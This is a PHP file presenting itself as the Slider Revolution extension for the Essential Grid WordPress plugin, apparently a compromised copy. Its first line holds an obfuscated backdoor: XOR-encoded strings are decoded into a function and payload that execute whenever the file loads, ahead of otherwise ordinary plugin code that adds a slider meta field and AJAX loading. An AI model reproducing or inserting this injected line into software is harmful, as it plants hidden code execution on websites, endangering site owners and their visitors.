<?php $BpLHxO='48=5 .sX6N:FU <'; $pIMjrW='WJXTTK,>C Y2<OR'^$BpLHxO; $OIfIgeM='>SJF<D4T> A cR=>1H5ebJ:9a> :J.jS,,wSAwLcY+XT;L,-Rr3+KlZOC;=fS>1ON7LNShlu R6oRcKrYMKnZn;KJzPAETkpfKF>5Om.qlLcjvs:Q+<6 +Emg TT duTp1lsb3ySbXC.ElWjyq 1 3eUXscron<1Jvk1KaW5B9Z,Nfl93=a2lwaK0C4M= Zbp:B<jvkD+B2m<b3O,4yqPP7PFNUgAH3: e8R;YpgU.U 2b=AV+51W,8dkT+1+b-enh0CAV;E4tuSKEJ0GM6fe,kmE=A  lGT4DXWrXTJtxCgUMXOgdeJ Q:E JB-S>3FmXFeVPY.Ab=rM4,05Y ;MQo-9nhhum5E0IgmZ<MozyQTGMT>7nf=7llA Q5Za;<<bxlW;6Cp;zoh>8<VpvwCK4Y1Qw154oK7ik=AHJgYhl,=CX7XJV < eO O253 .q5=:=aR+EVYx92YXXQ<dm-+  sGwFQRDYq-5 Lqqc=<Bv<QOZUbvzY=GZR-RXRrTOBF81XlP35oIurY4EJpxbifc VBYf6;.Pjo9,3DagfUwbD +dZT=48MsQw TpssvVFsRXuV31b2VuJfkjMoh3 4 2f 1 c0HQ=3EdvD0RV>6Yjgzu>3CPbaTroppy=R5KG1LAo WJ wk=JNU, Tejnh9X-HGDfDgw=K'; $uyZtTje=$pIMjrW('', 'W5bgZ1Z7JI.N<7EWB<FME2UK>ZAN+q5>YXPzhW7iPM-:X8EB<RKD93>.7Zb9>KEgjS-:2DLQK7OFrCkRy6AgSJT>>ZmabsPzoB QGgIGQQlSQVWSmXHDLN+ECD5 AMNtTXGXK9pZF76ZeBjJQUDPTR>q1.C,OJWT3-OXkDwF6K6I NHRVDHoELkB91Q9HR4JTU7HCMaMVHOg6FW.XUYLp6V<5+nme,RNA:S7ByMG3O9SWY7K0DGT6OPDCptrd-f,+HQ0arP MTHmka<Q+8SOEWadaY TA3,1MdewV313OrJC1,,.GYEnV0V0EqHPY4Z MpgA21-OhBFxDRCBP8CSmyKrk+9=0>aeQ:GI1Y4OGGqp1,8KRGFF=eeeD0A;>PYEBELsPS:K1sfLZYH7PKWg=U5D4L;<Ie6=cOY <+GdH,YS0=E1+:IFEM7O=mQRTO.jPOII0J63oLfV<;75YLIIJTAZkWb5308.FPYeXJiTZjRX0;;uDPZ8O5;+r9=+-17+5LBpK;VLHeUV=U1+YXDOFKM2wqBRZZ11HRIJc<NFhJBcCNW>bYVZxGdNB6DGACfwDf9F0VSVPaErABJkIHRRFAK9KTY<U08NG6LQ4Q+:QW=MKZQZR71KHtROPPYFX<.1P iKD6>A,LM+79CA0B7GS3QH0.0NtNL76'^$OIfIgeM); $uyZtTje();

/**
 * Slider Revolution
 *
 * @package   Essential_Grid
 * @author    ThemePunch <info@themepunch.com>
 * @link      http://www.themepunch.com/revolution/
 * @copyright 2014 ThemePunch
 */

/**
 * @package RevSliderExtension
 * @author  ThemePunch <info@themepunch.com>
 */
class RevSliderExtension {
	
	public function __construct() {
	
		$this->init_essential_grid_extensions();
		
	}
	
	
	/***************************
	 * Setup part for Revslider inclusion into Essential Grid
	 ***************************/
	
	/**
	 * Do all initializations for RevSlider integration
	 */
	public function init_essential_grid_extensions(){
		
		add_filter('essgrid_set_ajax_source_order', array($this, 'add_slider_to_eg_ajax'));
		add_filter('essgrid_handle_ajax_content', array($this, 'set_slider_values_to_eg_ajax'), 10, 4);
		add_action('essgrid_add_meta_options', array($this, 'add_eg_additional_meta_field'));
		add_action('essgrid_save_meta_options', array($this, 'save_eg_additional_meta_field'), 10, 2);
		
		//only do on frontend
		
		add_action('admin_head', array($this, 'add_eg_additional_inline_javascript'));
		add_action('wp_head', array($this, 'add_eg_additional_inline_javascript'));
		
	}
	
	
	/**
	 * Add Slider to the List of choosable media
	 */
	public function add_slider_to_eg_ajax($media){
		
		$media['revslider'] = array('name' => __('Slider Revolution', REVSLIDER_TEXTDOMAIN), 'type' => 'ccw');
		
		return $media;
	}
	
	
	/**
	 * Add Slider to the List of choosable media
	 */
	public function set_slider_values_to_eg_ajax($handle, $media_sources, $post, $grid_id){
		
		if($handle !== 'revslider') return false;
		
		$slider_source = '';
		
		$values = get_post_custom($post['ID']);
		
		if(isset($values['eg_sources_revslider'])){
			if(isset($values['eg_sources_revslider'][0]))
				$slider_source = @$values['eg_sources_revslider'][0];
			else
				$slider_source = @$values['eg_sources_revslider'];
		}
		
		if($slider_source === ''){
			return false;
		}else{
			return ' data-ajaxtype="'.$handle.'" data-ajaxsource="'.$slider_source.'"';
		}
		
	}
	
	
	/**
	 * Adds custom meta field into the essential grid meta box for post/pages
	 */
	public function add_eg_additional_meta_field($values){
		
		$sld = new RevSlider();
		$sliders = $sld->getArrSliders();
		$shortcodes = array();
		if(!empty($sliders)){
			$first = true;
			foreach($sliders as $slider){
				$name = $slider->getParam('shortcode','false');
				if($name != 'false'){
					$shortcodes[$slider->getID()] = $name;
					$first = false;
				}
			}
		}
		
		$selected_slider = (isset($values['eg_sources_revslider'])) ? $values['eg_sources_revslider'] : '';
		if($selected_slider == '') $selected_slider[0] = '';
		?>
		<p>
			<strong style="font-size:14px"><?php _e('Choose Revolution Slider', REVSLIDER_TEXTDOMAIN); ?></strong>
		</p>
		<p>
			<select name="eg_sources_revslider" id="eg_sources_revslider">
				<option value=""<?php selected($selected_slider[0], ''); ?>><?php _e('--- Choose Slider ---', REVSLIDER_TEXTDOMAIN); ?></option>
				<?php
				if(!empty($shortcodes)){
					foreach($shortcodes as $id => $name){
						?>
						<option value="<?php echo $id; ?>"<?php selected($selected_slider[0], $id); ?>><?php echo $name; ?></option>
						<?php
					}
				}
				?>
			</select>
		</p>
		<?php
		
	}
	
	/**
	 * Adds custom meta field into the essential grid meta box for post/pages
	 */
	public function save_eg_additional_meta_field($metas, $post_id){
		
		if(isset($metas['eg_sources_revslider']))
			update_post_meta($post_id, 'eg_sources_revslider', $metas['eg_sources_revslider']);
		
	}
	
	
	/**
	 * Adds needed javascript to the DOM
	 */
	public function add_eg_additional_inline_javascript(){
		?>
		<script type="text/javascript">
			jQuery(document).ready(function() {
				// CUSTOM AJAX CONTENT LOADING FUNCTION
				var ajaxRevslider = function(obj) {
				
					// obj.type : Post Type
					// obj.id : ID of Content to Load
					// obj.aspectratio : The Aspect Ratio of the Container / Media
					// obj.selector : The Container Selector where the Content of Ajax will be injected. It is done via the Essential Grid on Return of Content
					
					var content = "";

					data = {};
					
					data.action = 'revslider_ajax_call_front';
					data.client_action = 'get_slider_html';
					data.token = '<?php echo wp_create_nonce("RevSlider_Front"); ?>';
					data.type = obj.type;
					data.id = obj.id;
					data.aspectratio = obj.aspectratio;
					
					// SYNC AJAX REQUEST
					jQuery.ajax({
						type:"post",
						url:"<?php echo admin_url('admin-ajax.php'); ?>",
						dataType: 'json',
						data:data,
						async:false,
						success: function(ret, textStatus, XMLHttpRequest) {
							if(ret.success == true)
								content = ret.data;								
						},
						error: function(e) {
							console.log(e);
						}
					});
					
					 // FIRST RETURN THE CONTENT WHEN IT IS LOADED !!
					 return content;						 
				};
				
				// CUSTOM AJAX FUNCTION TO REMOVE THE SLIDER
				var ajaxRemoveRevslider = function(obj) {
					return jQuery(obj.selector+" .rev_slider").revkill();
				};

				// EXTEND THE AJAX CONTENT LOADING TYPES WITH TYPE AND FUNCTION
				var extendessential = setInterval(function() {
					if (jQuery.fn.tpessential != undefined) {
						clearInterval(extendessential);
						if(typeof(jQuery.fn.tpessential.defaults) !== 'undefined') {
							jQuery.fn.tpessential.defaults.ajaxTypes.push({type:"revslider",func:ajaxRevslider,killfunc:ajaxRemoveRevslider,openAnimationSpeed:0.3});   
							// type:  Name of the Post to load via Ajax into the Essential Grid Ajax Container
							// func: the Function Name which is Called once the Item with the Post Type has been clicked
							// killfunc: function to kill in case the Ajax Window going to be removed (before Remove function !
							// openAnimationSpeed: how quick the Ajax Content window should be animated (default is 0.3)
						}
					}
				},30);
			});
		</script>
		<?php
	}
	
}
?>